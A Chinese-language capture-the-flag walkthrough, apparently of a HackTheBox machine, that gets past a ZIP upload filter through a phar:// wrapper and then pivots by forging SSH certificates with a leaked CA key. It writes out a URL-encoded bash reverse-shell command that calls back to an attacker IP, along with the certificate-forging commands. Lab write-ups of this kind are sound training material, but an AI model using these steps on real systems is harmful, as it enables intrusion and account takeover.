
<img width="415" height="188" alt="image" src="https://github.com/user-attachments/assets/ceade72c-4e4d-4d4b-8215-cf0f8598ea93" />

Nmap端口扫描
开放了22 80 2222

<img width="399" height="315" alt="image" src="https://github.com/user-attachments/assets/1dd299f4-36fc-4866-954d-be4bc19fbcec" />

将itrc.ssg.htb添加到etc/hosts

<img width="391" height="310" alt="image" src="https://github.com/user-attachments/assets/a4662f96-5082-4a94-954d-5fb619a2c75a" />

访问web页面

<img width="415" height="248" alt="image" src="https://github.com/user-attachments/assets/31aa2c36-afae-4f95-b2af-fb4e19cd5a59" />

存在一个注册和登陆
<img width="415" height="249" alt="image" src="https://github.com/user-attachments/assets/060f6f0d-168a-495e-8d89-7ca690b18dff" />

注册一个账号然后登陆

这里可以创建一个ticket

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/b71dac5c-a285-420b-9a62-60ad46afe7d1" />

存在一个上传的地方

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/d514332b-ece2-4b45-8cfe-d06c259a4f08" />

但是只能上传ZIP文件
我尝试将反向shell制作成ZIP

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/20d28026-a8ca-438b-a1a4-fe86b4162d12" />

复制链接 监听端口
反弹shell失败


之后我查找了资料，可以用phar 协议，在shell文件的结尾必须使用__HALT_COMPILER();?>  

这个函数会停止编译器的执行
用来识别php的代码

<img width="392" height="310" alt="image" src="https://github.com/user-attachments/assets/bdf4450b-11f0-466d-a809-743d6de0cf50" />

使用phar协议后面接上upload路径再加上我们刚才的shell文件接上cmd=后面输入的命令 

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/14890a23-b4c0-4b17-a694-be58cfb4c13c" />

现在可以尝试执行反弹shell

<img width="415" height="212" alt="image" src="https://github.com/user-attachments/assets/818be17f-df02-48d6-bd30-a891f8277b9a" />

这里要把这些符号给进行URL编码
/bin/bash+-c+%27/bin/bash+-i+%3E%26+/dev/tcp/10.10.16.74/5555+0%3E%261%27

<img width="393" height="311" alt="image" src="https://github.com/user-attachments/assets/3c6361ec-888f-4400-84c6-94197d80599d" />

一进来就存在一个db.php

<img width="416" height="376" alt="image" src="https://github.com/user-attachments/assets/e2b073ab-6f20-4eb4-bed5-32d2f71be48d" />

<img width="388" height="312" alt="image" src="https://github.com/user-attachments/assets/7d73bd3c-fe3e-486b-bdca-c440bec89228" />

尝试链接mysql

<img width="393" height="313" alt="image" src="https://github.com/user-attachments/assets/5b4d0673-52f3-4403-9564-cf46f8bac766" />

连不上

<img width="393" height="312" alt="image" src="https://github.com/user-attachments/assets/7d0d9553-78eb-494a-93bd-ff442a58925d" />

来到uploads文件夹

<img width="391" height="313" alt="image" src="https://github.com/user-attachments/assets/51d703b5-f7d3-4bb4-8ebb-88ea553036f0" />

这一大坨看着像日志文件
通过网站来访问一下

<img width="416" height="274" alt="image" src="https://github.com/user-attachments/assets/d0736c10-f411-405b-8886-611bc9e16f8e" />

搜索关键字 找到了一个用户和密码

<img width="387" height="309" alt="image" src="https://github.com/user-attachments/assets/99aa09b6-5868-49df-9de3-0e718455996c" />

这个用户里面没有user.txt，说明我们还要横向到zzinter这个用户

<img width="389" height="311" alt="image" src="https://github.com/user-attachments/assets/01188e5a-11c7-4420-944c-9fe831e71c2e" />

<img width="400" height="309" alt="image" src="https://github.com/user-attachments/assets/0703d63c-9a83-45b9-b47d-37724b175345" />

存在一对CA私钥
新建一对私钥
ssh-keygen -t rsa -b 2048 -f johnny

t 代表类型，-b 代表字节，-f 代表文件。创建 2048 字节长的 rsa 类型并将其保存到密钥对。这将创建密钥对和 johnny.pub 文件。现在我们必须使用 ca-itrc 对其进行签名


ssh-keygen -s ca-itrc -n zzinter -I cat-itrc.pub johnny.pub
s 代表签名者，-n 代表目标用户。我们正在签署 johnny.pub 文件。-I 代表 id，这无所谓。现在让我们将这些文件传输到我们的计算机中。

<img width="393" height="309" alt="image" src="https://github.com/user-attachments/assets/c5f19fa8-248f-4132-bb50-f8e0b45ac02a" />

ssh-keygen -Lf johnny-cert.pub 
检查生成的证书

<img width="390" height="312" alt="image" src="https://github.com/user-attachments/assets/b30f2623-d222-454e-9cf3-d1a288435c58" />

<img width="393" height="310" alt="image" src="https://github.com/user-attachments/assets/0ae42289-228d-4de8-a9fc-9c248a2d0703" />

ssh -o CertificateFile=johnny-cert.pub -i johnny zzinter@localhost

使用刚才生成的证书以zzinter身份去登陆

<img width="389" height="309" alt="image" src="https://github.com/user-attachments/assets/cc7175c5-9774-4e19-b874-c2c82f68c431" />

<img width="387" height="309" alt="image" src="https://github.com/user-attachments/assets/dd5899d7-a674-4a93-a12a-938cc23fe402" />

拿到第一个flag
通过 ls -alh /.dockerenv得知我们当前存在于docker中

<img width="366" height="39" alt="image" src="https://github.com/user-attachments/assets/37f21f1c-ca1b-4ec2-9057-35e7d72bd8ee" />
这个目录下有一个sign_key_api.sh的文件

<img width="393" height="310" alt="image" src="https://github.com/user-attachments/assets/845bbe0c-23e3-43c5-98f3-ba30fb1513c0" />

ssh-keygen -t rsa -b 2048 -f support
和刚才一样创建一对密钥
chmod + 600 support

不行

我之后google了一波

我将这个 sign_key_api.sh文件下载到了kali
还有keypair和keypair.pub

<img width="390" height="310" alt="image" src="https://github.com/user-attachments/assets/2c160ec4-5c9d-4fed-a8bd-cb372e3acaaf" />

成功登陆 这里太复杂了

<img width="393" height="309" alt="image" src="https://github.com/user-attachments/assets/28183a12-f672-4637-8a4d-25f3d26eae6a" />

进入到/etc/ssh/auth_principals

<img width="391" height="310" alt="image" src="https://github.com/user-attachments/assets/ddc8f049-f677-42ef-8253-40d0ddaf3b76" />

<img width="389" height="305" alt="image" src="https://github.com/user-attachments/assets/b2639b54-d7f0-48be-a5c0-8f3f4b9efa80" />

将这两个添加到前面的脚本中

<img width="415" height="255" alt="image" src="https://github.com/user-attachments/assets/b87945e7-5d18-4ea1-a4d1-8ae2ffdc97b5" />

使用刚才的方法

<img width="398" height="312" alt="image" src="https://github.com/user-attachments/assets/d7a4d10b-b3a5-43f2-ba3e-0adb779eb9ca" />

<img width="395" height="309" alt="image" src="https://github.com/user-attachments/assets/490b883a-b426-440a-8540-f6f52fa9660b" />

但是我们已经拿到过user.txt了
过程太复杂了

<img width="392" height="310" alt="image" src="https://github.com/user-attachments/assets/45bc283a-3c01-488b-9eb4-7f7fe6be76bf" />

https://medium.com/@emsar69/htb-resource-write-up-654ca5c04ee4
参考文献
致敬伟大的作者救我于水深火热之中
